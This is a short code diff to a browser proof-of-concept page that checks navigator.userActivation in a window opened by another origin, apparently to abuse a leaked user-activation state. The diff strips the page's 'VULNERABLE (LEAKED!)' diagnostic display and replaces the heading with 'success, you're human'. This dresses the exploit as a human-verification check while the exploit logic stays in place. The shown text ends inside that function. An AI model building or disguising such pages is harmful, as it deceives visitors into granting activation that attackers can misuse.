@@ -5,9 +5,7 @@
     <title>PoC - Target Page (Vulnerable Origin)</title>
 </head>
 <body style="background: #e3f2fd; font-family: sans-serif; text-align: center; padding: 50px;">
-    <h1>Target Page (Target Origin)</h1>
-    <p>User Activation Status: <b id="act-status">Checking...</b></p>
-
+    <h1>success, you're human</h1>
     <script>
         if (window.opener) {
             setTimeout(() => {
@@ -19,11 +17,6 @@
 
         function checkAndExploit(triggerSource) {
             const isActive = navigator.userActivation.isActive;
-            const statusElement = document.getElementById('act-status');
-
-            statusElement.innerText = isActive ? "VULNERABLE (LEAKED!)" : "INACTIVE (NORMAL)";
-            statusElement.style.color = isActive ? "red" : "green";
-
             console.log(`[${triggerSource}] Activation state:`, isActive);
 
             if (isActive && !triggered) {
